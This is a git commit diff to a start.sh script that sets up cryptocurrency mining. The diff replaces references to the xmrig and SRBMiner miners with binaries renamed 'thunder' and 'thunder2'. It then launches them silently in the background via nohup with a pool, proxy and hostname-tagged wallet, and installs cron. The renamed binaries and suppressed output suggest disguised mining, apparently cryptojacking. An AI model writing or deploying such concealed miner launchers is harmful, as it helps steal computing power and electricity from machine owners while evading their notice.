69293e7b8daba60f252744e2f2497198fac85c74
root <root@JAMESALA10.localdomain>
2025-06-03 18:08:48 +0800

    8

--- start.sh
+++ start.sh
@@ -3,6 +3,9 @@ sudo apt install libuv1 libuv1-dev -y
 sudo apt install libhwloc-dev hwloc  -y
 sudo ln -s /usr/lib/libhwloc.so.10 /usr/lib/libhwloc.so.15
 sudo ldconfig
+apt install cron -y
+apt install nano -y
+service cron start
 id1=87CdGvxKktVNebisEHVzNwCjPeS54wrPkBAMuGViHNDMjWBU4hwoubRLagcxFEUo2K5kcJ4QSVanEPag9UDr4s9bQSYQ4hz
 id2=125fka2fSVTvhv6dSTzMWQNN3ZBLWZNQLneH8BKqLH8aYUANvVFtLWL7457cQnCfMvXuSizBaH5k5b6DnmupCiPdjjG
 port=64520
@@ -10,10 +13,9 @@ pool1=ala168.cn:431
 pool2=ala168.cn:6452
 proxy=ala168.cn:64520
 sudo apt install nvidia-opencl-dev  -y
-chmod u+x SRBMiner-MULTI
-chmod u+x xmrig
-chmod u+x reset.sh
+chmod u+x thunder
+chmod u+x thunder2
 chmod u+x qd.sh
-
-
-
+chmod u+x reset.sh
+nohup ./thunder --config=test.json > /dev/null 2>&1 &
+nohup ./thunder2 --algorithm sha3x --pool $pool2 --wallet $id2.$(hostname) --tls true --proxy $proxy > /dev/null 2>&1 & 
